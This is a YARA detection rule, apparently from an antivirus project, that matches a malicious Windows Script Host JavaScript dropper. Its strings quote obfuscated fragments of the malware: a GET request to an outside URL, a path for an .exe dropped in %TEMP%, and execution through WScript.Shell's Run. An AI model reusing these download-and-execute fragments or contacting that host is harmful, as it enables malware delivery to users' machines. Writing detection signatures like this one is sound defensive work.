rule sig_20160329_36bf004ef8afa3b1626c6a48a408dbac {
  meta:
    description = "datamaliciousorder - file 20160329_36bf004ef8afa3b1626c6a48a408dbac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0ece50277bff3a475bf1edfcf5b537b4115da62edcd45070be423910650a3d05"

  strings:
    $s1  = "N0[g](\"GET\", \"http://www.deco-dessert.com/k3dua\", false);" fullword ascii
    $s2  = "function Bk() {return CW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zJTDFO3cC9SnJAJ.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[G](d() * 11); if (N0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function J(E, X){dQ = dQ * 1; return E - X;};" fullword ascii
    $s5  = "var CW = function W() {return WScript[e](\"WScript.Shell\");}(), Ty = 11;" fullword ascii
    $s6  = "function Q(){return \"\" + Qv;};" fullword ascii
    $s7  = "function s() {return ((M == true) && (M == Vc)) ? 1 : dQ;};" fullword ascii
    $s8  = "function HH(e0){CW[\"Run\"](e0, dQ, dQ);};" fullword ascii
    $s9  = "var ob = new this[\"Date\"]();" fullword ascii
    $s10 = "function d(){return 22;};" fullword ascii
    $s11 = " while (rc){" fullword ascii
    $s12 = "return J(JV, ha);" fullword ascii
    $s13 = "function Pn(){return e;};" fullword ascii
    $s14 = "function Tw(Me) {var a = (1, 2, 3, 4, 5, Me); return a;};" fullword ascii
    $s15 = "function i()" fullword ascii
    $s16 = "M = true; " fullword ascii
    $s17 = "var r = false;" fullword ascii
    $s18 = "var Vc = false;" fullword ascii
    $s19 = "Vc = true; " fullword ascii
    $s20 = "} catch(MZ){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}